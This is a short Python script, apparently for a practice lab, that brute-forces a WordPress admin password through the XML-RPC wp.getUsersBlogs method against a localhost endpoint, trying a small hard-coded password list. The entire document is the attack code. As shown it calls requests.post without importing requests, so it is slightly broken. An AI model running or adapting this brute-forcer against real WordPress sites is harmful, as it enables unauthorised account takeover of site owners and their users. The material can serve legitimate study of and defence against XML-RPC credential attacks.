#!/usr/bin/python3

# Run: python3 wordpress-xmlrpc-bruteforcer.py

url = "http://127.0.0.1:8080/wordpress/xmlrpc.php"

passwords = ['wordpress', 'admin2', 'admin']

for i in passwords:
	xmldata = """

		<methodCall>
		<methodName>wp.getUsersBlogs</methodName>
		<params>
		<param><value>admin</value></param>
		<param><value>{}</value></param>
		</params>
		</methodCall>
	""".format(i)

	r = requests.post(url, data=xmldata)
	#print(r.text)
	if not "Incorrect" in r.text:
		print("Password Found: {}".format(i))
		break
